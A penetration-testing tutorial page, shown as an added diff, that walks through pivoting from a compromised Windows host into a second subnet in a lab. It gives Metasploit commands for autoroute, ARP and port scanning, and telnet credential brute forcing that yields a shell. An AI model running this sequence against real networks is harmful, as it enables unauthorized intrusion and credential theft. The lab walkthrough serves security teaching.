@@ -1,0 +1,71 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Telnet Pivoting through Meterpreter</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/telnet-pivoting-meterpreter/" rel="bookmark"><time class="entry-date published" datetime="2017-10-06T16:24:49+00:00">October 6, 2017</time><time class="updated" datetime="2025-05-27T12:03:32+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In our previous tutorial, we had discussed on <a href="http://www.hackingarticles.in/ssh-pivoting-using-meterpreter/"><strong>SSH pivoting</strong></a> and today we are going to discuss Telnet pivoting.</span></p>
+<p><span style="color: #000000;">From Offensive Security</span></p>
+<p><span style="color: #000000;"><strong>Pivoting</strong> is a technique to get inside an unreachable network with help of pivot (center point). In simple words, it is an attack through which an attacker can exploit that system which belongs to the different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then the attacker will able to target the client system for the attack.</span></p>
+<p><span style="color: #000000;"><strong>Lab Setup requirement:</strong></span></p>
+<p><span style="color: #000000;"><strong>Attacker machine</strong>: Kali Linux</span></p>
+<p><span style="color: #000000;">Pivot Machine (client): window operating system with <strong>two </strong>network interface</span></p>
+<p><span style="color: #000000;">Target Machine: Ubuntu server (Allow telnet service)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RcHdOnEepeI/WdesfMRaUoI/AAAAAAAAR0U/-ZaPGuJq27Ie_eKS32U8C0Y-gFy5rA-5wCLcBGAs/s1600/0.1.png"/></span></p>
+<p><span style="color: #000000;"><strong>Exploit pivot machine</strong></span></p>
+<p><span style="color: #000000;">Use exploit MS17-010 or multi handler to hack the pivot machine.</span></p>
+<pre class="lang:default decode:true">sessions</pre>
+<p><span style="color: #000000;">From the given image, you can confirm that I owned a pivot machine (192.168.1.107) meterpreter session1.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-A5EUdF6XjK4/WdesfBYDvUI/AAAAAAAAR0c/qenx083v0KY5P_79QrwUF6jERN-fa75kQCLcBGAs/s1600/0.png"/></span></p>
+<p><span style="color: #000000;">Check the network interface through the following command:</span></p>
+<pre class="lang:default decode:true">meterpreter&gt; ifconfig</pre>
+<p><span style="color: #000000;">From the given image you can observe two networks interface in pivot’s system <strong>1</strong><strong><sup>st</sup></strong><strong> </strong>for IP <strong>192.168.1.107 </strong>through which the attacker is connected and <strong>2</strong><strong><sup>nd</sup></strong> for IP <strong>10.0.0.20</strong> through which telnet server (targets) are connected.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-1IVP__t0NkA/WdesfZPSRNI/AAAAAAAAR0Y/rQ6UeTd2cyYvBaCqZARiInN0iY15C6KJQCLcBGAs/s1600/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Route Add</strong></span></h3>
+<p><span style="color: #000000;">Since the attacker belongs to <strong>the 192.168.1.1</strong> interface and target belongs to <strong>10.0.0.0 </strong>interface, therefore, it is not possible to directly make an attack on the target network until unless the attacker acquires the same network connection. In order to achieve a 10.0.0.0 network attacker need to run the <strong>post exploitation</strong> “autoroute”.</span></p>
+<pre class="lang:default decode:true">use post/multi/manage/autoroute 
+msf post(autoroute) &gt; set session 1
+msf post(autoroute) &gt; exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-dRA7jEPDQw4/WdesgE-4upI/AAAAAAAAR0g/HWnxzHVY2egbFg8NRUJZrCr59RlFtY9RACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">This Module will perform an ARP scan for a given IP range through a Meterpreter Session.</span></p>
+<pre class="lang:default decode:true">use post/windows/gather/arp_scanner
+msf post(arp_scanner) &gt; set rhosts 10.0.0.1-30
+msf post(arp_scanner) &gt; set session 1
+msf post(arp_scanner) &gt; set thread 20
+msf post(arp_scanner) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong> </strong>Here we found a new IP <strong>10.0.0.10</strong> as shown in the given image. Let’s perform TCP port scan for activated services on this machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OiKcGREAsPU/WdesgXTFncI/AAAAAAAAR0k/EhoDoR8fUSc0rKLachW4Lv9uHhPSGGL9ACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) &gt; set ports 23
+msf auxiliary(tcp) &gt; set rhosts 10.0.0.10
+msf auxiliary(tcp) &gt; set thread 10
+msf auxiliary(tcp) &gt;exploit</pre>
+<p><span style="color: #000000;">From given you can observe <strong>port 23</strong> is <strong>open </strong>and we know that port 23 is used for telnet service.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-hnTmNoLpvjM/WdesgZYTIBI/AAAAAAAAR0o/Zge7r40gJDgh7RaXJhloIZ0jm-gvFGAOgCLcBGAs/s1600/4.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Use Telnet login Brute Force Attack</strong></span></h3>
+<p><span style="color: #000000;">An attacker always tries to make a brute force attack for stealing credential for unauthorized access.</span></p>
+<p><span style="color: #000000;">This module will test a telnet login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.</span></p>
+<p><span style="color: #000000;">Now type the following command to Brute force TELNET login:</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/telnet/telnet_login
+msf auxiliary(telnet_login) &gt; set rhosts 10.0.0.10
+msf auxiliary(telnet_login) &gt; set user_file /root/Desktop/user
+msf auxiliary(telnet_login) &gt; set pass_file /root/Desktop/pass
+msf auxiliary(telnet_login) &gt; exploit</pre>
+<p><span style="color: #000000;">From given image you can observe that TELNET server is not secure against brute force attack because it is showing a matching combination of <strong>username: aarti</strong> and <strong>password: 123</strong> for login simultaneously it has opened victims command shell as <strong>session 2</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZyNhQN94264/WdeshdevjqI/AAAAAAAAR0s/F2z26xiQluYnYHBuRIYMJmXsNrW9OTUMwCLcBGAs/s1600/5.1.png"/></span></p>
+<p><span style="color: #000000;">Let’s count the number of victim sessions we have hold using the following command:</span></p>
+<pre class="lang:default decode:true">sessions</pre>
+<p><span style="color: #000000;">From the given image you can observe there are two sessions<strong> 1<sup>st</sup></strong> as the meterpreter session of windows system and <strong>2<sup>nd</sup></strong> as command shell of the telnet server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qQbctZxMfAM/Wdeshf3d8AI/AAAAAAAAR0w/_zMU2zLy4yoHTcZDbb4DJcrq4W65IfjkQCLcBGAs/s1600/5.2.png"/></span></p>
+<pre class="lang:default decode:true">sessions 2</pre>
+<p><span style="color: #000000;">Now attacker is command shell of the server, let’s verify through network configuration.</span></p>
+<pre class="lang:default decode:true ">ifconfig</pre>
+<p><span style="color: #000000;">From given, you can observe the network IP is<strong> 10.0.0.10</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-sRXTs4XCNcE/WdeshXFVuoI/AAAAAAAAR00/5b5poTQfT-471HBys3qpxc9d5XFtqNmUgCLcBGAs/s1600/5.3.png"/></span></p>
+<p><span style="color: #000000;"><strong> Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a href="https://www.linkedin.com/in/aarti--singh/"> here</a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
